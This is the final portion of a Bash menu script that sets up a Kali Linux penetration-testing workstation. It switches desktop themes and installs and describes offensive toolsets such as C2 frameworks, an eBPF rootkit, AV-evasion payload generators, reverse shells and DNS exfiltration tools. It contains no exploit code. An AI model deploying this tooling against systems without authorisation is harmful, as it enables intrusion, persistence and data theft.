    if [[ -n "$CHOICE" ]]; then
        local WP_PATH=$(realpath "$WP_DIR/$CHOICE")
        local DE=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:lower:]' '[:upper:]')
        local RUN_AS="sudo -u $REAL_USER"
        
        # Try to find DBUS session address to allow desktop commands to work via sudo
        local USER_ID=$(id -u "$REAL_USER")
        local DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus"

        if [[ "$DE" == *"XFCE"* ]]; then
            # XFCE: Usually has multiple monitors/workspaces, setting for the main one
            local PROPERTIES=($($RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xfce4-desktop -l | grep last-image))
            for p in "${PROPERTIES[@]}"; do
                $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xfce4-desktop -p "$p" -s "$WP_PATH"
            done
            info "Wallpaper updated for XFCE: $CHOICE"
        elif [[ "$DE" == *"GNOME"* ]]; then
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.background picture-uri "file://$WP_PATH"
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.background picture-uri-dark "file://$WP_PATH"
            info "Wallpaper updated for GNOME: $CHOICE"
        else
            # Fallback using feh if installed
            if command -v feh &>/dev/null; then
                $RUN_AS feh --bg-fill "$WP_PATH"
                info "Wallpaper updated via feh: $CHOICE"
            else
                msgbox "Desktop Not Supported" "Detected DE ($DE) is not natively supported for wallpaper switching and 'feh' is not installed."
            fi
        fi
        msgbox "Wallpaper Updated" "Wallpaper has been set to: $CHOICE"
    fi
}

set_theme() {
    local OPTIONS=(
        "Kali-Dark" "The classic Kali dark look"
        "Kali-Light" "Bright and clean theme"
        "Kali-Purple" "Modern purple accented theme"
        "Adwaita-dark" "Standard GNOME dark theme"
    )

    local CHOICE=$(whiptail --title "Change GTK System Theme" --menu "Select a theme:" 18 70 6 "${OPTIONS[@]}" 3>&1 1>&2 2>&3)

    if [[ -n "$CHOICE" ]]; then
        local DE=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:lower:]' '[:upper:]')
        local RUN_AS="sudo -u $REAL_USER"
        
        # Try to find DBUS session address
        local USER_ID=$(id -u "$REAL_USER")
        local DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus"
        log "Applying GTK Theme: $CHOICE (Detected DE: $DE)"

        if [[ "$DE" == *"XFCE"* ]]; then
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xsettings -p /Net/ThemeName -s "$CHOICE" 2>/dev/null
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" xfconf-query -c xfwm4 -p /general/theme -s "$CHOICE" 2>/dev/null
            info "GTK and XFWM4 Theme updated for XFCE: $CHOICE"
        elif [[ "$DE" == *"GNOME"* ]]; then
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.interface gtk-theme "$CHOICE" 2>/dev/null
            $RUN_AS DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" gsettings set org.gnome.desktop.interface color-scheme 'prefer-dark' 2>/dev/null
            info "GTK Theme updated for GNOME: $CHOICE"
        else
            msgbox "Desktop Not Supported" "Detected DE ($DE) is not natively supported for theme switching via this script."
        fi
        msgbox "Theme Updated" "System theme has been set to: $CHOICE"
    fi
}

toggle_undercover() {
    local DE=$(echo "$XDG_CURRENT_DESKTOP" | tr '[:lower:]' '[:upper:]')
    if [[ "$DE" == *"XFCE"* ]]; then
        sudo -u "$REAL_USER" kali-undercover
    else
        msgbox "XFCE Required" "Kali Undercover mode REQUIRES an active XFCE session.\n\nIf you just installed XFCE, you MUST log out and select 'XFCE Session' at the login screen (or restart) before this will work."
    fi
}

engagement_modules_menu() {
    while true; do
        local SUB=$(whiptail --title "Specialized Engagement Modules" --menu "Select a module to install:" 20 75 10 \
            "1" "OSCP Approved Tools (Responder, BloodHound, Evil-WinRM)" \
            "2" "C2 & Payload Hub (Havoc, Empire, Sliver, Hoaxshell)" \
            "3" "Heavy Recon Hub (reNgine, OneForAll, Sudomy, reconftw)" \
            "4" "Reverse Engineering & Post-Ex (Ghidra, PEASS, PlumHound)" \
            "5" "Interesting & Obscure Suite (TripleCross, Amnesiac, PacketWhisper)" \
            "6" "Leak & Credential Suite (Holehe, Maigret, h8mail)" \
            "7" "Back to Main Menu" 3>&1 1>&2 2>&3)

        [[ -z "$SUB" || "$SUB" == "7" ]] && return

        case $SUB in
            1) check_prereqs; install_oscp; msgbox "Success" "OSCP Approved Tools installed!";;
            2) check_prereqs; install_c2_frameworks; msgbox "Success" "C2 Frameworks installed!";;
            3) check_prereqs; install_go; install_heavy_automation; msgbox "Success" "Heavy Recon Hub installed!";;
            4) check_prereqs; install_rev_eng; msgbox "Success" "Reverse Engineering suite installed!";;
            5) check_prereqs; install_interesting_tools; msgbox "Success" "Interesting & Obscure Suite installed!";;
            6) install_python_env; msgbox "Success" "Leak Suite Installed!";;
        esac
    done
}

explanation_menu() {
    while true; do
        local CAT=$(whiptail --title "Comprehensive Tool Explanations" --menu "Select a category to explore:" 22 75 12 \
            "1" "System, Aliases & OSINT (Base, Bbot, Maigret)" \
            "2" "Heavy Recon & Automation (reNgine, reconftw, Nuclei)" \
            "3" "OSCP Approved Suite (NetExec, Responder, Ligolo)" \
            "4" "C2 & Payload Frameworks (Havoc, Sliver, Veil)" \
            "5" "Web & Vulnerability Scanning (Nikto, CMSmap, W3af)" \
            "6" "Reverse Engineering & Post-Ex (Ghidra, PEASS, GPT)" \
            "7" "Interesting & Obscure (TripleCross, PacketWhisper)" \
            "8" "Legacy & Niche (TheFatRat, Discover, Python2)" \
            "9" "Back to Main Menu" 3>&1 1>&2 2>&3)

        [[ -z "$CAT" || "$CAT" == "9" ]] && return

        case $CAT in
            1)
                whiptail --title "System & OSINT" --msgbox "• System: Hypervisor guest tools, GRUB perf tweaks, Docker.
• Aliases: l, myip, localip, listening, update-kali, nxc, msf.
• OSINT: Bbot (massive automation), Spiderfoot, Maigret (usernames), Holehe (emails), Ghunt (Google), Sublist3r." 15 70
                ;;
            2)
                whiptail --title "Heavy Recon & Automation" --msgbox "• reNgine: Visual automated recon dashboard.
• reconftw: Full-chain automated recon script.
• Nuclei: Fast, template-based vuln scanner (Go).
• OneForAll / Sudomy / Garud: Subdomain domination.
• Osmedeus: Offensive security engine for recon." 15 70
                ;;
            3)
                whiptail --title "OSCP Approved" --msgbox "• AutoRecon: Multi-threaded full-chain enumeration.
            • NetExec (NXC): Successor to CrackMapExec for AD.
            • Responder: LLMNR/NBT-NS poisoner.
            • BloodHound: Active Directory graph analysis.
            • Ligolo-ng / Chisel: Advanced pivoting and tunneling.
            • Kerbrute / Rubeus: Kerberos enumeration and roasting.
            • Evil-WinRM: The go-to shell for Windows.
            • nmapAutomator: Rapid initial enumeration script." 15 70
                ;;
            4)
                whiptail --title "C2 & Payload Hub" --msgbox "• Havoc: Modern, stealthy C2 framework.
• Sliver: Cross-platform C2 by BishopFox.
• Empire & Starkiller: Classic PowerShell C2 + GUI.
• Hoaxshell: Undetected Windows reverse shell.
• Veil / Venom / Unicorn: Payload generation and AV evasion.
• Koadic / SILENTTRINITY: Post-ex C2 frameworks." 15 70
                ;;
            5)
                whiptail --title "Web & Vuln Scanning" --msgbox "• Burp Suite / Wireshark: Essential traffic analysis.
• Nikto / W3af: Classic web vulnerability scanners.
• CMSmap: Targeted scanner for WordPress/Joomla/Drupal.
• RapidScan: Multi-tool scanner wrapper.
• nmap-vulners / vulscan: Vuln detection via Nmap.
• ffuf / Gobuster / Feroxbuster: Rapid web fuzzing." 15 70
                ;;
            6)
                whiptail --title "Rev-Eng & Post-Ex" --msgbox "• Ghidra: NSA's RE suite (Dark Theme enabled).
• PEASS-ng: WinPEAS and LinPEAS for PrivEsc.
• PlumHound: BloodHound for Blue/Purple teams.
• GPT_Vuln-analyzer: AI-assisted vuln analysis.
• BloodHound: Visual AD relationship mapping." 15 70
                ;;
            7)
                whiptail --title "Interesting & Obscure" --msgbox "• TripleCross: stealthy eBPF-based Linux rootkit.
• Amnesiac: PowerShell lateral movement framework.
• PacketWhisper: DNS-based covert exfiltration.
• PowerOpsToolKit: Stealthy WMI-based lateral movement.
• Ligolo-ng (Source): Customizable pivoting agents." 15 70
                ;;
            8)
                whiptail --title "Legacy & Niche" --msgbox "• TheFatRat: Massive payload creation framework.
• Discover: Comprehensive recon and setup script.
• TIDoS: All-in-one web hacking framework.
• RED_HAWK: Information gathering and vuln scanning.
• Cloakify: Data steganography and exfiltration.
• Python 2 Support: Restored for older security scripts." 15 70
                ;;
        esac
    done
}

show_menu() {
    local CHOICE=$(whiptail --title "Kali Setup Tool v4.1 (Ultimate Hub)" --menu "Select Option:" 28 85 18 \
        "1" "Full Setup (Everything + System Optimization)" \
        "2" "System Optimizer (Guest Tools, Performance, Legacy Protocols)" \
        "3" "Specialized Engagement Modules (OSCP, C2, Recon, Obscure)" \
        "4" "Power Management: Always On Mode" \
        "5" "Pro Browser: Hardened Firefox" \
        "6" "Advanced Networking (Ligolo/Proxy)" \
        "7" "API Key Vault (Secrets Manager)" \
        "8" "Wordlists & Payload Optimization" \
        "9" "Update All Tools" \
        "10" "System Audit & Health Check" \
        "11" "Appearance & Theme Manager" \
        "12" "Repair & Cleanup (Desktop, Apt, Logs)" \
        "13" "Tool Explanations" \
        "14" "Exit" 3>&1 1>&2 2>&3)

    case $CHOICE in
        1) check_prereqs; setup_env; setup_aliases; optimize_system; install_base; install_go; install_legacy_python; install_python_env; install_oscp; install_heavy_automation; install_c2_frameworks; install_rev_eng; install_vuln_scanners; install_legacy_tools; install_interesting_tools; setup_wordlists_payloads; setup_pro_browser; disable_power_management; msgbox "Success" "Full Ultimate Setup Complete!";;
        2) check_prereqs; optimize_system; msgbox "Success" "System Optimized!";;
        3) engagement_modules_menu ;;
        4) disable_power_management; msgbox "Success" "Power management disabled." ;;
        5) setup_pro_browser; msgbox "Success" "Firefox hardened." ;;
        6) setup_pro_networking ;;
        7) setup_api_vault ;;
        8) setup_wordlists_payloads; msgbox "Success" "Wordlists and Payloads ready." ;;
        9) if [[ -f "$SCRIPT_DIR/update.sh" ]]; then
               sudo "$SCRIPT_DIR/update.sh"
               msgbox "Update" "Update process completed."
           else
               msgbox "Error" "Update script not found."
           fi ;;
        10) run_audit ;;
        11) theme_menu ;;
        12) repair_desktop_icons; cleanup_system; msgbox "Success" "Cleanup complete!";;
        13) explanation_menu ;;
        14) exit 0 ;;
    esac
}

# --- Start ---
check_deps
python3 -c "import sys; content = open('kali-setup.sh', 'rb').read().replace(b'\r\n', b'\n'); open('kali-setup.sh', 'wb').write(content)" 2>/dev/null
while true; do show_menu; done
